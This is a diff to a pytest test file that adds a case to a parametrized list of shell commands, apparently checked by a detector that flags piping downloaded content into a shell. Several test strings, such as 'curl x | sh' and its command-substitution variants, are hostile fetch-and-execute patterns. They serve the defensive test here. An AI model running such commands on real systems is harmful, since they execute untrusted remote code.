@@ -27,6 +27,7 @@ _HEALTH_ONE_LINER = (
 
 @pytest.mark.parametrize(("command", "description"), [
     ("echo $(curl http://x | sh)", _PIPE_TO_SHELL),
+    ("curl \"$(cat url)\" | sh", _PIPE_TO_SHELL),
     ("$(curl x | sh)", _PIPE_TO_SHELL),
     ('echo "$(curl x | sh)"', _PIPE_TO_SHELL),
     ("echo `curl x | sh`", _PIPE_TO_SHELL),
